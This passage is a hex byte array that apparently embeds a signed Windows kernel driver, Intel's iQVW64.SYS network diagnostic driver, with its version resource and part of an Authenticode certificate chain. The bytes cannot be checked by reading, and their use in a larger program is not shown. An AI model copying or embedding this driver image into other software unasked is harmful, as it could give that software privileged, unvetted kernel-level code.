    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
    0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x60, 0x30, 0x5D, 0x00, 0x94, 0x03, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x94, 0x03, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x53, 0x00, 0x5F, 0x00, 0x56, 0x00, 0x45, 0x00,
    0x52, 0x00, 0x53, 0x00, 0x49, 0x00, 0x4F, 0x00, 0x4E, 0x00, 0x5F, 0x00, 0x49, 0x00, 0x4E, 0x00,
    0x46, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBD, 0x04, 0xEF, 0xFE, 0x00, 0x00, 0x01, 0x00,
    0x03, 0x00, 0x01, 0x00, 0x07, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05, 0x00, 0x26, 0x07, 0xCE, 0x0E,
    0x3F, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x04, 0x00, 0x02, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF2, 0x02, 0x00, 0x00,
    0x01, 0x00, 0x53, 0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x46, 0x00,
    0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00,
    0xCE, 0x02, 0x00, 0x00, 0x01, 0x00, 0x30, 0x00, 0x34, 0x00, 0x30, 0x00, 0x39, 0x00, 0x30, 0x00,
    0x34, 0x00, 0x42, 0x00, 0x30, 0x00, 0x00, 0x00, 0x46, 0x00, 0x13, 0x00, 0x01, 0x00, 0x43, 0x00,
    0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x79, 0x00, 0x4E, 0x00, 0x61, 0x00,
    0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00,
    0x6C, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x72, 0x00,
    0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x7E, 0x00, 0x2B, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x44, 0x00,
    0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00, 0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00,
    0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00,
    0x6C, 0x00, 0x28, 0x00, 0x52, 0x00, 0x29, 0x00, 0x20, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x74, 0x00,
    0x77, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x6B, 0x00, 0x20, 0x00, 0x41, 0x00, 0x64, 0x00, 0x61, 0x00,
    0x70, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x44, 0x00, 0x69, 0x00, 0x61, 0x00,
    0x67, 0x00, 0x6E, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x74, 0x00, 0x69, 0x00, 0x63, 0x00, 0x20, 0x00,
    0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x54, 0x00, 0x1A, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x56, 0x00,
    0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x33, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x37, 0x00,
    0x20, 0x00, 0x62, 0x00, 0x75, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x74, 0x00, 0x20, 0x00, 0x62, 0x00,
    0x79, 0x00, 0x3A, 0x00, 0x20, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x44, 0x00, 0x44, 0x00,
    0x4B, 0x00, 0x00, 0x00, 0x36, 0x00, 0x0B, 0x00, 0x01, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00,
    0x65, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00,
    0x65, 0x00, 0x00, 0x00, 0x69, 0x00, 0x51, 0x00, 0x56, 0x00, 0x57, 0x00, 0x36, 0x00, 0x34, 0x00,
    0x2E, 0x00, 0x53, 0x00, 0x59, 0x00, 0x53, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x00, 0x3F, 0x00,
    0x01, 0x00, 0x4C, 0x00, 0x65, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x43, 0x00, 0x6F, 0x00,
    0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x00, 0x00,
    0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00,
    0x74, 0x00, 0x20, 0x00, 0x28, 0x00, 0x43, 0x00, 0x29, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00,
    0x30, 0x00, 0x32, 0x00, 0x2D, 0x00, 0x32, 0x00, 0x30, 0x00, 0x31, 0x00, 0x33, 0x00, 0x20, 0x00,
    0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6F, 0x00,
    0x72, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00,
    0x6E, 0x00, 0x20, 0x00, 0x41, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x52, 0x00, 0x69, 0x00,
    0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x73, 0x00, 0x20, 0x00, 0x52, 0x00, 0x65, 0x00, 0x73, 0x00,
    0x65, 0x00, 0x72, 0x00, 0x76, 0x00, 0x65, 0x00, 0x64, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x3E, 0x00, 0x0B, 0x00, 0x01, 0x00, 0x4F, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x69, 0x00,
    0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x6E, 0x00,
    0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x69, 0x00, 0x51, 0x00, 0x56, 0x00, 0x57, 0x00,
    0x36, 0x00, 0x34, 0x00, 0x2E, 0x00, 0x53, 0x00, 0x59, 0x00, 0x53, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x00, 0x14, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00,
    0x63, 0x00, 0x74, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x28, 0x00, 0x52, 0x00, 0x29, 0x00,
    0x20, 0x00, 0x69, 0x00, 0x51, 0x00, 0x56, 0x00, 0x57, 0x00, 0x36, 0x00, 0x34, 0x00, 0x2E, 0x00,
    0x53, 0x00, 0x59, 0x00, 0x53, 0x00, 0x00, 0x00, 0x36, 0x00, 0x09, 0x00, 0x01, 0x00, 0x50, 0x00,
    0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00,
    0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00,
    0x30, 0x00, 0x33, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x56, 0x00, 0x61, 0x00, 0x72, 0x00, 0x46, 0x00, 0x69, 0x00,
    0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x24, 0x00, 0x04, 0x00, 0x00, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x73, 0x00,
    0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x09, 0x04, 0xB0, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x08, 0x1F, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x30, 0x82, 0x1E, 0xF8, 0x06, 0x09, 0x2A, 0x86,
    0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x02, 0xA0, 0x82, 0x1E, 0xE9, 0x30, 0x82, 0x1E, 0xE5, 0x02,
    0x01, 0x01, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05, 0x00, 0x30,
    0x4C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04, 0xA0, 0x3E, 0x30,
    0x3C, 0x30, 0x17, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0F, 0x30,
    0x09, 0x03, 0x01, 0x00, 0xA0, 0x04, 0xA2, 0x02, 0x80, 0x00, 0x30, 0x21, 0x30, 0x09, 0x06, 0x05,
    0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05, 0x00, 0x04, 0x14, 0x2C, 0xBF, 0xE4, 0xAD, 0x0E, 0x12, 0x31,
    0xFF, 0x3E, 0x19, 0xC1, 0x9C, 0xA9, 0x31, 0x1D, 0x95, 0x2C, 0xE1, 0x70, 0xB7, 0xA0, 0x82, 0x19,
    0xCE, 0x30, 0x82, 0x03, 0xEE, 0x30, 0x82, 0x03, 0x57, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x10,
    0x7E, 0x93, 0xEB, 0xFB, 0x7C, 0xC6, 0x4E, 0x59, 0xEA, 0x4B, 0x9A, 0x77, 0xD4, 0x06, 0xFC, 0x3B,
    0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30,
    0x81, 0x8B, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x5A, 0x41, 0x31,
    0x15, 0x30, 0x13, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0C, 0x57, 0x65, 0x73, 0x74, 0x65, 0x72,
    0x6E, 0x20, 0x43, 0x61, 0x70, 0x65, 0x31, 0x14, 0x30, 0x12, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13,
    0x0B, 0x44, 0x75, 0x72, 0x62, 0x61, 0x6E, 0x76, 0x69, 0x6C, 0x6C, 0x65, 0x31, 0x0F, 0x30, 0x0D,
    0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x06, 0x54, 0x68, 0x61, 0x77, 0x74, 0x65, 0x31, 0x1D, 0x30,
    0x1B, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x14, 0x54, 0x68, 0x61, 0x77, 0x74, 0x65, 0x20, 0x43,
    0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x1F, 0x30, 0x1D,
    0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x16, 0x54, 0x68, 0x61, 0x77, 0x74, 0x65, 0x20, 0x54, 0x69,
    0x6D, 0x65, 0x73, 0x74, 0x61, 0x6D, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x43, 0x41, 0x30, 0x1E, 0x17,
    0x0D, 0x31, 0x32, 0x31, 0x32, 0x32, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5A, 0x17, 0x0D,
    0x32, 0x30, 0x31, 0x32, 0x33, 0x30, 0x32, 0x33, 0x35, 0x39, 0x35, 0x39, 0x5A, 0x30, 0x5E, 0x31,
    0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x1D, 0x30, 0x1B,
    0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x14, 0x53, 0x79, 0x6D, 0x61, 0x6E, 0x74, 0x65, 0x63, 0x20,
    0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x30, 0x30, 0x2E, 0x06,
    0x03, 0x55, 0x04, 0x03, 0x13, 0x27, 0x53, 0x79, 0x6D, 0x61, 0x6E, 0x74, 0x65, 0x63, 0x20, 0x54,
    0x69, 0x6D, 0x65, 0x20, 0x53, 0x74, 0x61, 0x6D, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x65, 0x72,
    0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x43, 0x41, 0x20, 0x2D, 0x20, 0x47, 0x32, 0x30, 0x82, 0x01,
    0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00,
    0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02, 0x82, 0x01, 0x01, 0x00, 0xB1, 0xAC,
    0xB3, 0x49, 0x54, 0x4B, 0x97, 0x1C, 0x12, 0x0A, 0xD8, 0x25, 0x79, 0x91, 0x22, 0x57, 0x2A, 0x6F,
    0xDC, 0xB8, 0x26, 0xC4, 0x43, 0x73, 0x6B, 0xC2, 0xBF, 0x2E, 0x50, 0x5A, 0xFB, 0x14, 0xC2, 0x76,
    0x8E, 0x43, 0x01, 0x25, 0x43, 0xB4, 0xA1, 0xE2, 0x45, 0xF4, 0xE8, 0xB7, 0x7B, 0xC3, 0x74, 0xCC,
    0x22, 0xD7, 0xB4, 0x94, 0x00, 0x02, 0xF7, 0x4D, 0xED, 0xBF, 0xB4, 0xB7, 0x44, 0x24, 0x6B, 0xCD,
    0x5F, 0x45, 0x3B, 0xD1, 0x44, 0xCE, 0x43, 0x12, 0x73, 0x17, 0x82, 0x8B, 0x69, 0xB4, 0x2B, 0xCB,
    0x99, 0x1E, 0xAC, 0x72, 0x1B, 0x26, 0x4D, 0x71, 0x1F, 0xB1, 0x31, 0xDD, 0xFB, 0x51, 0x61, 0x02,
    0x53, 0xA6, 0xAA, 0xF5, 0x49, 0x2C, 0x05, 0x78, 0x45, 0xA5, 0x2F, 0x89, 0xCE, 0xE7, 0x99, 0xE7,
    0xFE, 0x8C, 0xE2, 0x57, 0x3F, 0x3D, 0xC6, 0x92, 0xDC, 0x4A, 0xF8, 0x7B, 0x33, 0xE4, 0x79, 0x0A,
    0xFB, 0xF0, 0x75, 0x88, 0x41, 0x9C, 0xFF, 0xC5, 0x03, 0x51, 0x99, 0xAA, 0xD7, 0x6C, 0x9F, 0x93,
    0x69, 0x87, 0x65, 0x29, 0x83, 0x85, 0xC2, 0x60, 0x14, 0xC4, 0xC8, 0xC9, 0x3B, 0x14, 0xDA, 0xC0,
    0x81, 0xF0, 0x1F, 0x0D, 0x74, 0xDE, 0x92, 0x22, 0xAB, 0xCA, 0xF7, 0xFB, 0x74, 0x7C, 0x27, 0xE6,
    0xF7, 0x4A, 0x1B, 0x7F, 0xA7, 0xC3, 0x9E, 0x2D, 0xAE, 0x8A, 0xEA, 0xA6, 0xE6, 0xAA, 0x27, 0x16,
    0x7D, 0x61, 0xF7, 0x98, 0x71, 0x11, 0xBC, 0xE2, 0x50, 0xA1, 0x4B, 0xE5, 0x5D, 0xFA, 0xE5, 0x0E,
    0xA7, 0x2C, 0x9F, 0xAA, 0x65, 0x20, 0xD3, 0xD8, 0x96, 0xE8, 0xC8, 0x7C, 0xA5, 0x4E, 0x48, 0x44,
    0xFF, 0x19, 0xE2, 0x44, 0x07, 0x92, 0x0B, 0xD7, 0x68, 0x84, 0x80, 0x5D, 0x6A, 0x78, 0x64, 0x45,
    0xCD, 0x60, 0x46, 0x7E, 0x54, 0xC1, 0x13, 0x7C, 0xC5, 0x79, 0xF1, 0xC9, 0xC1, 0x71, 0x02, 0x03,
    0x01, 0x00, 0x01, 0xA3, 0x81, 0xFA, 0x30, 0x81, 0xF7, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E,
    0x04, 0x16, 0x04, 0x14, 0x5F, 0x9A, 0xF5, 0x6E, 0x5C, 0xCC, 0xCC, 0x74, 0x9A, 0xD4, 0xDD, 0x7D,
    0xEF, 0x3F, 0xDB, 0xEC, 0x4C, 0x80, 0x2E, 0xDD, 0x30, 0x32, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05,
    0x05, 0x07, 0x01, 0x01, 0x04, 0x26, 0x30, 0x24, 0x30, 0x22, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05,
    0x05, 0x07, 0x30, 0x01, 0x86, 0x16, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x6F, 0x63, 0x73,
    0x70, 0x2E, 0x74, 0x68, 0x61, 0x77, 0x74, 0x65, 0x2E, 0x63, 0x6F, 0x6D, 0x30, 0x12, 0x06, 0x03,
    0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04, 0x08, 0x30, 0x06, 0x01, 0x01, 0xFF, 0x02, 0x01, 0x00,
    0x30, 0x3F, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x38, 0x30, 0x36, 0x30, 0x34, 0xA0, 0x32, 0xA0,
    0x30, 0x86, 0x2E, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x63, 0x72, 0x6C, 0x2E, 0x74, 0x68,
    0x61, 0x77, 0x74, 0x65, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x54, 0x68, 0x61, 0x77, 0x74, 0x65, 0x54,
    0x69, 0x6D, 0x65, 0x73, 0x74, 0x61, 0x6D, 0x70, 0x69, 0x6E, 0x67, 0x43, 0x41, 0x2E, 0x63, 0x72,
    0x6C, 0x30, 0x13, 0x06, 0x03, 0x55, 0x1D, 0x25, 0x04, 0x0C, 0x30, 0x0A, 0x06, 0x08, 0x2B, 0x06,
    0x01, 0x05, 0x05, 0x07, 0x03, 0x08, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x01, 0x01, 0xFF,
    0x04, 0x04, 0x03, 0x02, 0x01, 0x06, 0x30, 0x28, 0x06, 0x03, 0x55, 0x1D, 0x11, 0x04, 0x21, 0x30,
    0x1F, 0xA4, 0x1D, 0x30, 0x1B, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x10,
    0x54, 0x69, 0x6D, 0x65, 0x53, 0x74, 0x61, 0x6D, 0x70, 0x2D, 0x32, 0x30, 0x34, 0x38, 0x2D, 0x31,
    0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03,
    0x81, 0x81, 0x00, 0x03, 0x09, 0x9B, 0x8F, 0x79, 0xEF, 0x7F, 0x59, 0x30, 0xAA, 0xEF, 0x68, 0xB5,
    0xFA, 0xE3, 0x09, 0x1D, 0xBB, 0x4F, 0x82, 0x06, 0x5D, 0x37, 0x5F, 0xA6, 0x52, 0x9F, 0x16, 0x8D,
    0xEA, 0x1C, 0x92, 0x09, 0x44, 0x6E, 0xF5, 0x6D, 0xEB, 0x58, 0x7C, 0x30, 0xE8, 0xF9, 0x69, 0x8D,
    0x23, 0x73, 0x0B, 0x12, 0x6F, 0x47, 0xA9, 0xAE, 0x39, 0x11, 0xF8, 0x2A, 0xB1, 0x9B, 0xB0, 0x1A,
    0xC3, 0x8E, 0xEB, 0x59, 0x96, 0x00, 0xAD, 0xCE, 0x0C, 0x4D, 0xB2, 0xD0, 0x31, 0xA6, 0x08, 0x5C,
    0x2A, 0x7A, 0xFC, 0xE2, 0x7A, 0x1D, 0x57, 0x4C, 0xA8, 0x65, 0x18, 0xE9, 0x79, 0x40, 0x62, 0x25,
    0x96, 0x6E, 0xC7, 0xC7, 0x37, 0x6A, 0x83, 0x21, 0x08, 0x8E, 0x41, 0xEA, 0xDD, 0xD9, 0x57, 0x3F,
    0x1D, 0x77, 0x49, 0x87, 0x2A, 0x16, 0x06, 0x5E, 0xA6, 0x38, 0x6A, 0x22, 0x12, 0xA3, 0x51, 0x19,
    0x83, 0x7E, 0xB6, 0x30, 0x82, 0x04, 0xA3, 0x30, 0x82, 0x03, 0x8B, 0xA0, 0x03, 0x02, 0x01, 0x02,
    0x02, 0x10, 0x0E, 0xCF, 0xF4, 0x38, 0xC8, 0xFE, 0xBF, 0x35, 0x6E, 0x04, 0xD8, 0x6A, 0x98, 0x1B,
    0x1A, 0x50, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05,
    0x00, 0x30, 0x5E, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53,
    0x31, 0x1D, 0x30, 0x1B, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x14, 0x53, 0x79, 0x6D, 0x61, 0x6E,
    0x74, 0x65, 0x63, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31,
    0x30, 0x30, 0x2E, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x27, 0x53, 0x79, 0x6D, 0x61, 0x6E, 0x74,
    0x65, 0x63, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x20, 0x53, 0x74, 0x61, 0x6D, 0x70, 0x69, 0x6E, 0x67,
    0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x43, 0x41, 0x20, 0x2D, 0x20, 0x47,
    0x32, 0x30, 0x1E, 0x17, 0x0D, 0x31, 0x32, 0x31, 0x30, 0x31, 0x38, 0x30, 0x30, 0x30, 0x30, 0x30,
    0x30, 0x5A, 0x17, 0x0D, 0x32, 0x30, 0x31, 0x32, 0x32, 0x39, 0x32, 0x33, 0x35, 0x39, 0x35, 0x39,
    0x5A, 0x30, 0x62, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53,
    0x31, 0x1D, 0x30, 0x1B, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x14, 0x53, 0x79, 0x6D, 0x61, 0x6E,
    0x74, 0x65, 0x63, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31,
    0x34, 0x30, 0x32, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x2B, 0x53, 0x79, 0x6D, 0x61, 0x6E, 0x74,
    0x65, 0x63, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x20, 0x53, 0x74, 0x61, 0x6D, 0x70, 0x69, 0x6E, 0x67,
    0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x53, 0x69, 0x67, 0x6E, 0x65, 0x72,
    0x20, 0x2D, 0x20, 0x47, 0x34, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48,
    0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01,
    0x0A, 0x02, 0x82, 0x01, 0x01, 0x00, 0xA2, 0x63, 0x0B, 0x39, 0x44, 0xB8, 0xBB, 0x23, 0xA7, 0x44,
    0x49, 0xBB, 0x0E, 0xFF, 0xA1, 0xF0, 0x61, 0x0A, 0x53, 0x93, 0xB0, 0x98, 0xDB, 0xAD, 0x2C, 0x0F,
    0x4A, 0xC5, 0x6E, 0xFF, 0x86, 0x3C, 0x53, 0x55, 0x0F, 0x15, 0xCE, 0x04, 0x3F, 0x2B, 0xFD, 0xA9,
    0x96, 0x96, 0xD9, 0xBE, 0x61, 0x79, 0x0B, 0x5B, 0xC9, 0x4C, 0x86, 0x76, 0xE5, 0xE0, 0x43, 0x4B,
    0x22, 0x95, 0xEE, 0xC2, 0x2B, 0x43, 0xC1, 0x9F, 0xD8, 0x68, 0xB4, 0x8E, 0x40, 0x4F, 0xEE, 0x85,
    0x38, 0xB9, 0x11, 0xC5, 0x23, 0xF2, 0x64, 0x58, 0xF0, 0x15, 0x32, 0x6F, 0x4E, 0x57, 0xA1, 0xAE,
    0x88, 0xA4, 0x02, 0xD7, 0x2A, 0x1E, 0xCD, 0x4B, 0xE1, 0xDD, 0x63, 0xD5, 0x17, 0x89, 0x32, 0x5B,
    0xB0, 0x5E, 0x99, 0x5A, 0xA8, 0x9D, 0x28, 0x50, 0x0E, 0x17, 0xEE, 0x96, 0xDB, 0x61, 0x3B, 0x45,
    0x51, 0x1D, 0xCF, 0x12, 0x56, 0x0B, 0x92, 0x47, 0xFC, 0xAB, 0xAE, 0xF6, 0x66, 0x3D, 0x47, 0xAC,
    0x70, 0x72, 0xE7, 0x92, 0xE7, 0x5F, 0xCD, 0x10, 0xB9, 0xC4, 0x83, 0x64, 0x94, 0x19, 0xBD, 0x25,
    0x80, 0xE1, 0xE8, 0xD2, 0x22, 0xA5, 0xD0, 0xBA, 0x02, 0x7A, 0xA1, 0x77, 0x93, 0x5B, 0x65, 0xC3,
    0xEE, 0x17, 0x74, 0xBC, 0x41, 0x86, 0x2A, 0xDC, 0x08, 0x4C, 0x8C, 0x92, 0x8C, 0x91, 0x2D, 0x9E,
    0x77, 0x44, 0x1F, 0x68, 0xD6, 0xA8, 0x74, 0x77, 0xDB, 0x0E, 0x5B, 0x32, 0x8B, 0x56, 0x8B, 0x33,
    0xBD, 0xD9, 0x63, 0xC8, 0x49, 0x9D, 0x3A, 0xC5, 0xC5, 0xEA, 0x33, 0x0B, 0xD2, 0xF1, 0xA3, 0x1B,
    0xF4, 0x8B, 0xBE, 0xD9, 0xB3, 0x57, 0x8B, 0x3B, 0xDE, 0x04, 0xA7, 0x7A, 0x22, 0xB2, 0x24, 0xAE,
    0x2E, 0xC7, 0x70, 0xC5, 0xBE, 0x4E, 0x83, 0x26, 0x08, 0xFB, 0x0B, 0xBD, 0xA9, 0x4F, 0x99, 0x08,
    0xE1, 0x10, 0x28, 0x72, 0xAA, 0xCD, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x82, 0x01, 0x57, 0x30,
    0x82, 0x01, 0x53, 0x30, 0x0C, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04, 0x02, 0x30,
    0x00, 0x30, 0x16, 0x06, 0x03, 0x55, 0x1D, 0x25, 0x01, 0x01, 0xFF, 0x04, 0x0C, 0x30, 0x0A, 0x06,
